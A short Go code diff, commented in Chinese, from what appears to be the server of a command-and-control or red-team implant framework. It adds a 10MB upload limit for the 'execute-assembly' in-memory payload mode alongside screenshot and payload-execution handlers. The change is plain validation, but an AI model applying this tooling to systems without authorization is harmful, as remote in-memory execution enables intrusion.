@@ -104,6 +104,11 @@ func TakeScreenshot(c *gin.Context) {
 // MaxExecuteBinBytes 内存执行载荷大小上限（main.go 的按路径请求体上限引用同一个值）
 const MaxExecuteBinBytes = 100 << 20
 
+// maxAssemblyBytes execute-assembly 的程序集上限：客户端 execute-assembly_windows.go
+// 的 maxAssemblySize 是 10MB，超过会被客户端拒收。服务端提前拦下并说明原因，
+// 否则表现是"命令已发送"然后一直等不到结果。
+const maxAssemblyBytes = 10 << 20
+
 // executeBinModes 支持的载荷执行模式（与前端 PluginsView 的 7 个模式一一对应）
 var executeBinModes = map[string]bool{
 	"execute-assembly": true,
@@ -189,6 +194,13 @@ func ExecuteBin(c *gin.Context) {
 	}
 	if !executeBinModes[mode] {
 		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "data": "Invalid execution mode"})
+		return
+	}
+	// 按模式的上限：.NET 程序集在客户端有 10MB 硬限制（见 maxAssemblyBytes 注释）
+	if mode == "execute-assembly" && file.Size > maxAssemblyBytes {
+		c.JSON(http.StatusBadRequest, gin.H{"status": 400, "data": fmt.Sprintf(
+			"程序集过大: %d bytes（execute-assembly 上限 %d bytes，客户端硬限制）",
+			file.Size, maxAssemblyBytes)})
 		return
 	}
 
